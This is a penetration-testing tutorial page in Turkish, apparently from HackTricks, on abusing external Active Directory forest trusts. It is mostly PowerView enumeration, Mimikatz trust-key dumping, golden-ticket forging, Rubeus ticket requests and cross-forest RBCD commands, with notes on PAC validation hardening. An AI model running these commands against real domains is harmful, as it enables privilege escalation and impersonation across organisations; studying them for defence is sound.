# External Forest Domain - OneWay (Inbound) veya bidirectional

{{#include ../../banners/hacktricks-training.md}}

Bu senaryoda bir external domain size güveniyor (veya her ikiniz de birbirinize güveniyorsunuz); dolayısıyla bu domain üzerinden bir tür access elde edebilirsiniz.

## Enumeration

Öncelikle **trust** ilişkisini **enumerate** etmeniz gerekir:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*`, cross-forest abuse paths (RBCD, SIDHistory)'in ekstra ön koşullar olmadan çalışmasının olası olup olmadığını hızlıca görmenizi sağlar.<sup>[[2]](#references)</sup>

Önceki enumeration sırasında **`crossuser`** kullanıcısının, **external domain** içindeki **DC** üzerinde **Admin erişimine** sahip **`External Admins`** grubunun içinde olduğu bulundu.

## İlk Erişim

Diğer domain'de kullanıcınızın **özel** bir erişimini **bulamadıysanız**, yine de AD Methodology'ye geri dönüp **ayrıcalıksız bir kullanıcıdan privesc** gerçekleştirmeyi deneyebilirsiniz (örneğin kerberoasting gibi şeyler):

`-Domain` parametresini kullanarak **Powerview functions** ile **diğer domain'i** şu şekilde **enumerate** edebilirsiniz:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Kimliğe Bürünme

### Oturum Açma

External domain'a erişimi olan kullanıcıların kimlik bilgilerini kullanarak normal bir yöntemle oturum açtığınızda erişebilmelisiniz:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

Bir forest trust üzerinden [**SID History**](sid-history-injection.md) abuse edebilirsiniz.

Bir kullanıcı **bir forest'tan diğerine** migrate edilir ve **SID Filtering etkin değilse**, **diğer forest'tan bir SID eklemek** mümkün hale gelir; bu **SID**, **trust üzerinden authentication** sırasında **kullanıcının token'ına** eklenir.

> [!WARNING]
> Hatırlatmak gerekirse, signing key'i şu komutla alabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

**Trusted** key ile mevcut domain kullanıcısını **impersonate eden** bir **TGT imzalayabilirsiniz**.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Kullanıcı kimliğine tamamen bürünme
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Trusting forest'ta bir machine account'u kontrol ettiğinizde Cross-forest RBCD (SID filtering / selective auth yok)

Yabancı principal'iniz (FSP), trusting forest'taki computer object'leri yazabilen bir gruba (ör. `Account Operators`, özel provisioning grubu) sizi dahil ederse, bu forest'taki bir target host üzerinde **Resource-Based Constrained Delegation** yapılandırabilir ve oradaki herhangi bir user'ı impersonate edebilirsiniz:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Bu yalnızca **SelectiveAuthentication devre dışıysa** ve **SID filtering** denetlediğiniz SID'yi kaldırmıyorsa çalışır. SIDHistory forging işlemini atlayan hızlı bir lateral path'tir ve trust incelemelerinde sıklıkla gözden kaçar.<sup>[[2]](#references)</sup>

### PAC doğrulama güçlendirmesi

**CVE-2024-26248**/**CVE-2024-29056** için PAC signature validation güncellemeleri, forest'lar arası ticket'larda signing enforcement ekler. **Compatibility mode**'da forged inter-realm PAC/SIDHistory/S4U path'leri, patch uygulanmamış DC'lerde hâlâ çalışabilir. **Enforcement mode**'da, bir forest trust üzerinden geçen unsigned veya değiştirilmiş PAC verileri, hedef forest trust key'ine de sahip olmadığınız sürece reddedilir. Registry override'ları (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`), kullanılabilir oldukları sürece bu davranışı zayıflatabilir.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)

{{#include ../../banners/hacktricks-training.md}}
